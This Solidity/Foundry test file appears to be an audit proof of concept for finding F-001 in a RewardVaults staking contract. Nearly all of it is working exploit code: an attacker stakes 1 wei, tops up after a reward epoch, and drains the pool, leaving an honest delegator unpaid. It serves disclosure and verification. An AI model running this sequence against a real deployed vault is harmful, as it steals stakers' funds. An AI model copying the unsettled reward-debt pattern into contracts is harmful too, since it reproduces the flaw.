// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import { Test, console2 } from "forge-std/Test.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { RewardVaults } from "../../src/rewards/RewardVaults.sol";

/// @dev Minimal ERC20 standing in for TangleToken. RewardVaults only ever calls
///      balanceOf(address) and transfer(address,uint256) on tntToken, so these
///      two selectors are all that is exercised by the contract under test.
contract MockTNT {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "MockTNT: insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @notice F-001: top-up does not settle reward debt -> stake retroactively
///         earns rewards accrued before it existed, draining the pool.
contract F001_TopUpRewardDebtPoC is Test {
    RewardVaults vault;
    MockTNT tnt;

    address ADMIN = address(this); // gets ADMIN_ROLE + REWARDS_MANAGER_ROLE
    address ASSET = address(0xA55E7); // staking asset key for the vault
    address OPERATOR = address(0x09E7A);
    address ATTACKER = address(0xA77ACE);
    address HONEST = address(0x404E57);

    uint256 constant LARGE = 1_000 ether; // honest stake / attacker top-up
    uint256 constant REWARD = 100 ether; // epoch reward distributed to the pool

    function setUp() public {
        tnt = new MockTNT();

        RewardVaults impl = new RewardVaults();
        // operatorCommissionBps = 0 so 100% of the reward flows to the delegator
        // pool, making the accounting easy to read.
        bytes memory init =
            abi.encodeCall(RewardVaults.initialize, (ADMIN, address(tnt), uint16(0)));
        vault = RewardVaults(address(new ERC1967Proxy(address(impl), init)));

        // One vault for ASSET with a cap large enough for both stakers.
        vault.createVault(ASSET, type(uint128).max);

        // Fund the contract with exactly ONE epoch reward. There is only REWARD
        // worth of TNT backing the pool — enough to pay one fair share, NOT two.
        tnt.mint(address(vault), REWARD);
    }

    function test_F001_TopUpStealsPriorEpochRewards() public {
        // ── SETUP: attacker delegates a dust 1 wei; honest delegates LARGE ──
        // Both join BEFORE any reward is distributed. lockMultiplierBps = 0 means
        // score == amount (no boost).
        vault.recordDelegate(ATTACKER, OPERATOR, ASSET, 1, 0);
        vault.recordDelegate(HONEST, OPERATOR, ASSET, LARGE, 0);

        // ── EPOCH: distribute REWARD into the operator pool ──
        // accumulatedPerShare grows over totalStaked = LARGE + 1.
        vault.distributeRewards(ASSET, OPERATOR, REWARD);

        uint256 attackerFair = vault.pendingDelegatorRewards(ASSET, ATTACKER, OPERATOR);
        uint256 honestFair = vault.pendingDelegatorRewards(ASSET, HONEST, OPERATOR);
        console2.log("--- after epoch, before top-up ---");
        console2.log("attacker fair pending (1 wei stake):", attackerFair);
        console2.log("honest   fair pending (LARGE stake):", honestFair);

        // Attacker contributed 1 / (LARGE+1) of the stake during the epoch, so a
        // fair share is ~0. Honest earned essentially the whole reward.
        assertEq(attackerFair, 0, "attacker fair share should round to 0");
        assertApproxEqAbs(honestFair, REWARD, 1e6, "honest should earn ~full reward");

        // ── ATTACK: attacker TOPS UP by LARGE *after* the reward accrued ──
        // recordDelegate sees stakedAmount != 0 (not a new delegator) so it adds
        // boostedScore WITHOUT settling pending or advancing lastAccumulatedPerShare.
        vault.recordDelegate(ATTACKER, OPERATOR, ASSET, LARGE, 0);

        uint256 attackerAfter = vault.pendingDelegatorRewards(ASSET, ATTACKER, OPERATOR);
        console2.log("--- after attacker top-up of LARGE ---");
        console2.log("attacker pending NOW:", attackerAfter);

        // ── OUTCOME: attacker's freshly-added stake retroactively earns the
        // rewards that accrued before it existed. Pending jumps from ~0 to ~REWARD.
        assertApproxEqAbs(
            attackerAfter, REWARD, 1e6, "BUG: top-up retroactively earns the full prior reward"
        );
        assertGt(attackerAfter, attackerFair + REWARD / 2, "attacker pending exploded after top-up");

        // The pool now owes attacker(~REWARD) + honest(~REWARD) = ~2x REWARD, but
        // only REWARD of TNT was ever funded. Prove insolvency by claiming.
        uint256 attackerClaimed = vault.claimDelegatorRewardsFor(ASSET, OPERATOR, ATTACKER);
        console2.log("attacker CLAIMED:", attackerClaimed);
        console2.log("attacker TNT balance:", tnt.balanceOf(ATTACKER));
        console2.log("vault TNT remaining:", tnt.balanceOf(address(vault)));

        assertApproxEqAbs(attackerClaimed, REWARD, 1e6, "attacker drained ~full epoch reward");

        // The honest delegator, who actually staked LARGE for the whole epoch,
        // can no longer be paid: the attacker already drained the pool.
        uint256 honestStillOwed = vault.pendingDelegatorRewards(ASSET, HONEST, OPERATOR);
        console2.log("honest STILL owed:", honestStillOwed);
        console2.log("vault can cover honest?", tnt.balanceOf(address(vault)) >= honestStillOwed);

        assertApproxEqAbs(honestStillOwed, REWARD, 1e6, "honest is still owed ~full reward");
        assertLt(
            tnt.balanceOf(address(vault)),
            honestStillOwed,
            "INSOLVENT: vault cannot pay the honest delegator after attacker top-up theft"
        );

        // And the honest claim now reverts on insufficient balance, confirming the drain.
        vm.expectRevert(bytes("Insufficient reward balance"));
        vault.claimDelegatorRewardsFor(ASSET, OPERATOR, HONEST);
        console2.log("honest claim REVERTED: Insufficient reward balance (funds stolen)");
    }
}
